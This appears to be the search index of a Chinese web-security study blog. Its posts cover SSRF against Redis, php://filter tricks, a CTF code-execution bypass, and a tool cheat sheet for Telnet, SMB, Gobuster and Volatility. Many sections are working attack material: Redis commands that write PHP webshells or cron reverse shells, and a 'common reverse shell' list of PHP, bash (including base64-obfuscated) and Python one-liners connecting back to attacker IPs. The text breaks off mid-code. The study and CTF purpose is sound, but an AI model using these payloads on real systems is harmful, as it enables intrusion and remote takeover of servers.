class=\"line\">Java：泛微OA/云桥、致远OA、蓝凌OA、用友OA</span><br><span class=\"line\">ASP：启莱OA</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"SSRF怎么结合Redis相关漏洞利用\"><a href=\"#SSRF怎么结合Redis相关漏洞利用\" class=\"headerlink\" title=\"SSRF怎么结合Redis相关漏洞利用\"></a>SSRF怎么结合Redis相关漏洞利用</h4><p>主要通过两种协议，dict协议和gopher协议。</p>\n<p>dict协议利用Redis相关漏洞：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">探测端口：</span><br><span class=\"line\">ssrf.php?url=dict://x.x.x.x:$端口$   利用burpsuite爆破端口</span><br><span class=\"line\"></span><br><span class=\"line\">探测是否设置弱口令：</span><br><span class=\"line\">ssrf.php?url=dict://x.x.x.x:6379/info     已知端口利用info探测是否设置了密码</span><br><span class=\"line\"></span><br><span class=\"line\">爆破密码：</span><br><span class=\"line\">ssrf.php?url=dict://x.x.x.x:6379/auth:$密码$     利用burpsuite爆破密码</span><br><span class=\"line\"></span><br><span class=\"line\">写入webshell：</span><br><span class=\"line\">    1.  url=dict://xxx.xxx:6379/config:set:dir:/var/www/html   切换文件目录</span><br><span class=\"line\">    2.  url=dict://xxx.xxx:6379/config:set:dbfilename:webshell.php   设置保存文件名</span><br><span class=\"line\">    3. url=dict://xxx.xxx:6379/set:webshell:&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f\\x28\\x29\\x3b\\x3f\\x3e&quot;     //利用dict协议写入webshell   以上的字符编码是&lt;?php phpinfo();?&gt;的十六进制</span><br><span class=\"line\">    4.  url=dict://x.x.x.x:6379/save   保存</span><br></pre></td></tr></table></figure>\n\n<p>gopher协议利用redis未授权访问漏洞写入webshell：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">常规利用步骤：</span><br><span class=\"line\"></span><br><span class=\"line\">set x &quot;\\n\\n\\n&lt;?php @eval($_POST[&#x27;redis&#x27;]);?&gt;\\n\\n\\n&quot;</span><br><span class=\"line\">config set dir /var/www/html  </span><br><span class=\"line\">config set dbfilename shell.php</span><br><span class=\"line\">save</span><br><span class=\"line\"></span><br><span class=\"line\">两次url编码后构造url：</span><br><span class=\"line\">http://192.168.1.1/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2fspan><br><span class=\"line\"></span><br><span class=\"line\">//第一次url解码和第二次url解码</span><br><span class=\"line\">//同理其他类似计划任务反弹和写入ssh公钥等getshell方式相似</span><br></pre></td></tr></table></figure>\n\n","categories":["web安全学习"],"tags":["安全","hvv","蓝队"]},{"title":"记录php中filter伪协议的妙用","url":"/2022/11/14/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/","content":"<p>原文地址：<a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\">P神的谈一谈php:&#x2F;&#x2F;filter的妙用</a></p>\n<h2 id=\"XXE中的使用\"><a href=\"#XXE中的使用\" class=\"headerlink\" title=\"XXE中的使用\"></a>XXE中的使用</h2><p>由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件的时候可能会抛出错误。</p>\n<p>原因：PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>的语法和XML符合，所以在解析XML的时候可能会被误认为是XML。其中的特殊字符还有可能会与标准的XML相冲突，从而会导致出错。</p>\n<p>php:&#x2F;&#x2F;filter是PHP中特有的协议流，作用是作为“中间流”来处理其他流。</p>\n<blockquote>\n<p>readfile(“php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;php:&#x2F;&#x2F;input”);</p>\n</blockquote>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-248-1024x546.png\"></p>\n<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php:&#x2F;&#x2F;filter协议流处理一遍，这样就能有效规避特殊字符造成混乱</p>\n<blockquote>\n<p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;xxe.php</p>\n</blockquote>\n<p>这里没复现成功……</p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-249-1024x428.png\"></p>\n<h2 id=\"巧用编码和解码\"><a href=\"#巧用编码和解码\" class=\"headerlink\" title=\"巧用编码和解码\"></a>巧用编码和解码</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"string\">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$content</span> .= <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"variable\">$content</span>);</span><br></pre></td></tr></table></figure>\n\n<p>因为content在开头加上了exit()，所以就算我们写入了一句话木马，也是无法执行的。但是这里的filename是可控协议的，然后我们就可以利用php:&#x2F;&#x2F;filter来绕过了</p>\n<p>怎么绕过呢？</p>\n<p>使用<code>php://filter</code>中的<code>base64-decode</code>来绕过exit，base64编码只包含64个可打印字符，而PHP在进行base64解码的时候，遇到不在其中的字符时会自动跳过，只会对合法字符进行解码。<br>所以，当<code>$content</code>被加上<code>&lt;?php exit(); ?&gt;</code>之后，我们可以先试用<code>php://filter/write=convert.base64-decode</code>来对其解码。<br>这里只有 <code>phpexit</code> 会被解码，又因为base64解码是4个byte为一组的，所以我们要给他加上一个字符凑齐8个字符，就会被正常解码了，解码之后 <code>&lt;?php exit(); ?&gt;</code> 就没有了</p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-250-1024x376.png\"></p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-251-1024x251.png\"></p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-252-1024x473.png\" alt=\"img\"></p>\n<h2 id=\"利用字符串操作方法\"><a href=\"#利用字符串操作方法\" class=\"headerlink\" title=\"利用字符串操作方法\"></a>利用字符串操作方法</h2><p><code>&lt;?php exit; ?&gt;</code>实际上就是一个XML标签，所以我们还可以使用<code>strip_tags</code>函数去除他，而<code>php://filter</code>也是支持这个方法的。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">readfile</span>(<span class=\"string\">&#x27;php://filter/read=string.strip_tags/resource=php://input&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-253-1024x541.png\" alt=\"img\"></p>\n<p>如果还是上面的那个题目，<code>&lt;?php exit; ?&gt;</code>还是可以被去除的，但是我们写入的PHP代码也会被去除，所以这个是没有作用的。</p>\n<p>php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell进行base64编码，在调用完<code>strip_tags</code>之后再进行base64解码，这样就可以绕过了</p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-254-1024x377.png\" alt=\"img\"></p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95php%E4%B8%ADfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A6%99%E7%94%A8/image-255-1024x259.png\" alt=\"img\"></p>\n<p>除了这个，还有rot13编码可以独立的完成绕过。</p>\n<p>如果文章有何不妥之处，请您指出。</p>\n","categories":["web安全学习"],"tags":["CTF","web","安全"]},{"title":"记录一道代码执行题目","url":"/2022/12/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/","content":"<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getPos</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> <span class=\"string\">&#x27;find.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$findflag</span>;</span><br><span class=\"line\">&#125; <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?</span> php</span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cover&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cover&#x27;</span>] == <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;cover&#x27;</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;ok&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>]) &gt; <span class=\"number\">35</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>]);</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;over maxlength!!&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$code</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/[A-Za-z0-9_.]+/&quot;</span>, <span class=\"variable\">$code</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Hacher!!!&quot;</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    @<span class=\"keyword\">eval</span>(<span class=\"variable\">$code</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span>        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Access Deny&#x27;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>第一个if刚开始想复杂了，弱比较，其实直接为空就可以绕过了。</p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-5-1024x479.png\"></p>\n<p>然后就是后面的正则匹配了，不能出现字母和数字以及<code>_.</code>，这还是P神的无数字字符的webshell。使用取反绕过</p>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-6-1024x569.png\"></p>\n<p>然后可以使用一句话，但是这似乎跟PHP的版本有关系。</p>\n<blockquote>\n<p>?cover&#x3D;&amp;code&#x3D;(<del>%9E%8C%8C%9A%8D%8B)(</del>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%C7%A2%D6%D6);</p>\n</blockquote>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-7-1024x515.png\"></p>\n<p>这里只发现7.0.9版本是可以的。</p>\n<p>但是我们为什么执意要搞到shell呢？RCE也很香吧……使用<code>system(&#39;ls&#39;)</code></p>\n<blockquote>\n<p>(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C);</p>\n</blockquote>\n<p><img src=\"/images/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/image-8-1024x654.png\"></p>\n<p>其实这里也是可以拿到shell的，不能死死的抓着一个东西不放，还是得换换思路</p>\n<p>过滤还是有很多没有进行过滤的，所以我们还可以利用其他没有过滤的字符</p>\n<blockquote>\n<p>一句话：?&gt;<?=`{${~\"%a0%b8%ba%ab\"}[%C7]}`?>&amp;%C7&#x3D;’ls’;</p>\n<p>?&gt;<?={$_GET[%C7]?>}&amp;%C7&#x3D;’ls’;</p>\n</blockquote>\n","categories":["web安全学习"],"tags":["CTF","web","安全"]},{"title":"常见知识点汇总","url":"/2023/06/08/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/","content":"<h2 id=\"kali常见自带路径\"><a href=\"#kali常见自带路径\" class=\"headerlink\" title=\"kali常见自带路径\"></a>kali常见自带路径</h2><ul>\n<li>字典字典：<code>/usr/share/wordlists/</code></li>\n</ul>\n<h2 id=\"网卡配置\"><a href=\"#网卡配置\" class=\"headerlink\" title=\"网卡配置\"></a>网卡配置</h2><ul>\n<li>禁用&#x2F;启用网卡：<code>ifconfig [NIC_NAME] Down/Up</code></li>\n</ul>\n<h2 id=\"Telnet\"><a href=\"#Telnet\" class=\"headerlink\" title=\"Telnet\"></a>Telnet</h2><ul>\n<li>-a：自动登录</li>\n<li>-c：不读取用户的.telnetrc文件</li>\n<li>-d：打开debug开关</li>\n<li>-e：使用char作为转义字符</li>\n<li>-E：不使用转义字符</li>\n<li>-l：参试以user身份自动登录</li>\n<li>-L：使用8位数据传输仅用于输出</li>\n<li>-n：将跟踪的信息记录到FILE中</li>\n<li>-r：使用类似于rlogin的用户界面</li>\n<li>常见用法：<ul>\n<li>telnet <code>IP地址</code></li>\n<li>telnet -l <code>用户名</code> <code>IP地址</code></li>\n</ul>\n</li>\n<li>注意事项：<ul>\n<li>root用户名可以用空密码通过telnet登录到目标</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"FTP\"><a href=\"#FTP\" class=\"headerlink\" title=\"FTP\"></a>FTP</h2><ul>\n<li>常见用法：<ul>\n<li><code>ftp IP地址</code></li>\n</ul>\n</li>\n<li>注意事项：<ul>\n<li>常见用户名和密码：<code>anonymous/任意密码</code></li>\n</ul>\n</li>\n<li>其他知识点：<ul>\n<li>FTP的安全版本是<code>SFTP</code></li>\n<li>FTP登录成功的响应代码是<code>230</code></li>\n<li>登录FTP下载文件的命令是<code>get</code></li>\n<li>上传文件的命令是<code>put</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"SMB\"><a href=\"#SMB\" class=\"headerlink\" title=\"SMB\"></a>SMB</h2><ul>\n<li>全称：<code>Server Message Block</code></li>\n<li>运行端口：<code>445</code></li>\n<li>nmap通常扫描出来得到的服务名为：<code>microsoft-ds</code></li>\n</ul>\n<h3 id=\"smbclient工具使用教程\"><a href=\"#smbclient工具使用教程\" class=\"headerlink\" title=\"smbclient工具使用教程\"></a>smbclient工具使用教程</h3><ul>\n<li>列出某个IP地址所提供的共享文件夹：<code>smbclient -L 198.168.0.1 [-U username%password]</code><ul>\n<li>Remote Admin：远程管理</li>\n<li>Default share：默认分享</li>\n<li>Remote IPC：远程IPC</li>\n</ul>\n</li>\n<li>像FTP客户端一样使用smbclient：<code>smbclient //192.168.0.1/tmp [-U username%password]</code></li>\n<li>直接使用一次性命令：<code>smbclient -c &quot;ls&quot;  //192.168.0.1/tmp [-U username%password]</code></li>\n<li>如果用户共享&#x2F;&#x2F;192.168.0.1&#x2F;tmp的方式是只读的，会提示<code>NT_STATUS_ACCESS_DENIED making remote directory /share1</code>，此时就可以使用<code>smbclient -c &quot;mkdir /share1&quot;  //192.168.0.1/tmp [-U username%password]</code>解决</li>\n</ul>\n<h2 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h2><ul>\n<li>运行端口：6379</li>\n<li>连接Redis：<code>redis-cli -h host -p port -a password</code></li>\n<li>常用命令(未授权访问)：<ul>\n<li>查看信息：<code>info</code></li>\n<li>删除所有数据库内容：<code>flushable</code></li>\n<li>刷新数据库：<code>flush</code></li>\n<li>选择数据库：<code>select number</code>，例如：<code>select 1</code></li>\n<li>看所有键：<code>KEYS *</code>，使用<code>select nun</code>可以查看键值数据，例如：<code>keys *</code></li>\n<li>设置变量：<code>set test &quot;who am i</code></li>\n<li>查看变量值：<code>get 变量/键值</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"redis写入webshell\"><a href=\"#redis写入webshell\" class=\"headerlink\" title=\"redis写入webshell\"></a>redis写入webshell</h3><ul>\n<li>切换目录到网站的根目录：<code>config set dir /var/www/html/</code></li>\n<li>写入恶意代码：<code>set x &quot;\\n\\n\\n&lt;?php phpinfo();?&gt;\\n\\n\\n&quot;</code></li>\n<li>写入一句话木马：<code>set xx &quot;\\n\\n\\n&lt;?php @eval($_REQUEST[8]);?&gt;\\n\\n\\n&quot;</code></li>\n<li>磁盘中生成木马文件shell.php：<code>config set dbfilename shell.php</code></li>\n<li>进行保存：<code>save</code></li>\n</ul>\n<h3 id=\"redis秘钥登录SSH\"><a href=\"#redis秘钥登录SSH\" class=\"headerlink\" title=\"redis秘钥登录SSH\"></a>redis秘钥登录SSH</h3><p>略</p>\n<h3 id=\"redis利用计划任务进行反弹shell\"><a href=\"#redis利用计划任务进行反弹shell\" class=\"headerlink\" title=\"redis利用计划任务进行反弹shell\"></a>redis利用计划任务进行反弹shell</h3><ul>\n<li>开启监听：<code>nc -lvnp 7777</code></li>\n<li>写入计划任务：<code>set xx &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.175.161/7777 0&gt;&amp;1\\n&quot;</code></li>\n<li>设置导出的路径：<code>config set dir /var/spool/cron/</code></li>\n<li>设置导出的文件名：<code>config set dbfilename root</code></li>\n<li>保存：<code>save</code></li>\n</ul>\n<h2 id=\"Gobuster\"><a href=\"#Gobuster\" class=\"headerlink\" title=\"Gobuster\"></a>Gobuster</h2><h3 id=\"常用命令行选项：\"><a href=\"#常用命令行选项：\" class=\"headerlink\" title=\"常用命令行选项：\"></a>常用命令行选项：</h3><ul>\n<li>-fw：使用通配符结果强制处理域</li>\n<li>-np：隐藏进度输出</li>\n<li>-m &lt;mode&gt;：使用哪种模式，dir（默认）或者dns</li>\n<li>-q：禁用横幅&#x2F;下划线输出</li>\n<li>-t &lt;threads&gt;：要运行的线程数，默认10</li>\n<li>-u &lt;url&#x2F;domain&gt;：完整URL或者基本域名</li>\n<li>-v：详细输出，显示所有结果</li>\n<li>-w &lt;wordlist&gt;：设置字典</li>\n</ul>\n<h4 id=\"dns模式的命令选项：\"><a href=\"#dns模式的命令选项：\" class=\"headerlink\" title=\"dns模式的命令选项：\"></a>dns模式的命令选项：</h4><ul>\n<li>-cn：显示CNAME记录，不能与<code>-i</code>选项一起使用</li>\n<li>-i：显示结果的所有IP地址</li>\n</ul>\n<h4 id=\"dir模式的命令选项：\"><a href=\"#dir模式的命令选项：\" class=\"headerlink\" title=\"dir模式的命令选项：\"></a>dir模式的命令选项：</h4><ul>\n<li>-a &lt;user agent string&gt;：指定要在请求标头中发送的用户代理字符串</li>\n<li>-c &lt;http cookie&gt;：指定cookie</li>\n<li>-e：指定呈现完整URL的扩展模式</li>\n<li>-f：附加&#x2F;目录暴力</li>\n<li>-k：跳出SSL证书的验证</li>\n<li>-l：显示响应的长度</li>\n<li>-n：无状态模式，禁用结果状态代码的输出</li>\n<li>-o &lt;file&gt;：指定要将输出写入的文件名</li>\n<li>-p &lt;proxy url&gt;：指定用于所有请求的代理</li>\n<li>-r：重定向</li>\n<li>-s &lt;status code&gt;：指定状态码</li>\n<li>-x &lt;extensions&gt;：要检查的扩展名列表</li>\n<li>-P &lt;password&gt;：http授权密码</li>\n<li>-U &lt;username&gt;：http授权用户名</li>\n<li>-to &lt;timeout&gt;：http超时，默认10s，示例：10s</li>\n</ul>\n<h2 id=\"vol取证\"><a href=\"#vol取证\" class=\"headerlink\" title=\"vol取证\"></a>vol取证</h2><ul>\n<li>查看镜像的配置文件：<code>imageinfo</code>，eg：<code>./volatility -f 1.raw imageinfo</code></li>\n<li>指定配置：<code>--profile=指定镜像</code></li>\n<li>查看进程：<code>pslist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 pslist</code></li>\n<li>提取进程文件：<code>memdump</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 memdump -p 4272 --dump-dir=./</code><ul>\n<li><code>-p</code>：指定进程号</li>\n<li><code>--dump-dir</code>：指定存储文件的位置</li>\n</ul>\n</li>\n<li>查看桌面的情况：<code>filescan|grep Desktop</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 filescan |grep Desktop</code>，<code>filescan</code>的作用是扫描文件，然后可以搭配<code>grep</code>进行使用</li>\n<li>使用偏移量导出文件：<code>dumpfiles</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000002a2897e0 -D ./</code><ul>\n<li><code>-Q</code>：指定偏移量</li>\n<li><code>-D</code>：存储文件的文件夹</li>\n</ul>\n</li>\n<li>列出cmd命令：<ul>\n<li><code>cmdline</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 cmdline</code></li>\n<li><code>cmdscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 cmdscan</code></li>\n</ul>\n</li>\n<li>列出进程列表：<ul>\n<li><code>psscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 psscan</code></li>\n<li><code>pslist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 pslist</code></li>\n</ul>\n</li>\n<li>扫描建立的连接和套接字（类似于netstat）：<ul>\n<li><code>netscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 netscan</code></li>\n</ul>\n</li>\n<li>扫描Windows服务列表：<ul>\n<li><code>svcscan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 svcscan</code></li>\n</ul>\n</li>\n<li>获取GDI的截图：<ul>\n<li><code>screenshot</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 screenshot --dump-dir=./</code></li>\n</ul>\n</li>\n<li>显示每个进程的加载dll列表：<ul>\n<li><code>dlllist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 dlllist</code></li>\n</ul>\n</li>\n<li>提取日志文件：<ul>\n<li><code>dumpregistry</code>，<code>./volatility -f 1.raw --profile=Win7SP1x64 dumpregistry --dump-dir=./</code></li>\n</ul>\n</li>\n<li>查看用户名密码信息：<ul>\n<li><code>hashdump</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 hashdump</code></li>\n</ul>\n</li>\n<li>查看浏览器历史记录：<ul>\n<li><code>idhistory</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 iehistory</code></li>\n</ul>\n</li>\n<li>查看文件：<ul>\n<li><code>filescan</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 filescan</code></li>\n</ul>\n</li>\n<li>查看注册表配置单元：<ul>\n<li><code>hivelist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 hivelist</code></li>\n</ul>\n</li>\n<li>查看注册表键名：<ul>\n<li><code>hivedump</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a005fef010</code></li>\n</ul>\n</li>\n<li>查看注册表键值：<ul>\n<li><code>printkey</code>，eg：<code>./volatility -f 1.vmem --profile=Win7SP1x64 printkey -K &quot;xxxxxxx&quot;</code></li>\n</ul>\n</li>\n<li>查看运行程序相关的记录，比如最后一次更新的时间，运行的次数等等：<ul>\n<li><code>userassist</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 userassist</code></li>\n</ul>\n</li>\n<li>最大程序提取信息：<ul>\n<li><code>timeliner</code>，eg：<code>./volatility -f 1.raw --profile=Win7SP1x64 timeliner</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"常见反弹shell方式\"><a href=\"#常见反弹shell方式\" class=\"headerlink\" title=\"常见反弹shell方式\"></a>常见反弹shell方式</h2><h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><ul>\n<li>php反弹shell：<code>php -r &#39;$sock=fsockopen(&quot;192.168.1.1&quot;,9001);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></li>\n<li>写入PHP一句话木马：<code>echo ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWzhdKTsgPz4nID4gc2hlbGwucGhw | base64 -d | sh</code>，webshell：<code>&lt;?php @eval($_POST[8]); ?&gt;</code>[shell.php]</li>\n</ul>\n<h3 id=\"bash反弹shell\"><a href=\"#bash反弹shell\" class=\"headerlink\" title=\"bash反弹shell\"></a>bash反弹shell</h3><ul>\n<li>普通bash反弹shell：<code>bash -i &gt;&amp; /dev/tcp/10.0.2.15/7777 0&gt;&amp;1</code></li>\n<li>嵌套bash反弹shell：<code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNzc3NyAwJj4x&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></li>\n<li>绕过bash反弹shell：<ul>\n<li>先进行base64编码：<code>echo &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.5/9001 0&gt;&amp;1&quot; | base64</code></li>\n<li>然后嵌套：<code>echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNzc3NyAwPiYx&quot; | base64 -d|bash</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h3><h4 id=\"python升级shell\"><a href=\"#python升级shell\" class=\"headerlink\" title=\"python升级shell\"></a>python升级shell</h4><ul>\n<li><p>python升级shell，升级为pty-shell：<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>，然后再<code>export TERM=xterm</code>，然后<code>Crtl+Z</code>将反弹shell置于后台，再使用<code>stty raw -echo;fg;reset</code>重新获取shell</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">export TERM=xterm-256color</span><br><span class=\"line\">export SHELL=/bin/bash</span><br><span class=\"line\">stty size</span><br><span class=\"line\">\t这里的值是多少，最后的值也要修改为多少</span><br><span class=\"line\">\t</span><br><span class=\"line\">使用Crtl+Z，然后输入下面的内容</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">直接输入下面的内容</span><br><span class=\"line\">\treset</span><br><span class=\"line\">stty rows 0 columns 0</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h4 id=\"python反弹shell\"><a href=\"#python反弹shell\" class=\"headerlink\" title=\"python反弹shell\"></a>python反弹shell</h4><h5 id=\"第一种方式\"><a href=\"#第一种方式\" class=\"headerlink\" title=\"第一种方式\"></a>第一种方式</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket, subprocess, os</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;10.0.2.15&quot;</span>,<span class=\"number\">8888</span>))</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">0</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">1</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">2</span>)</span><br><span 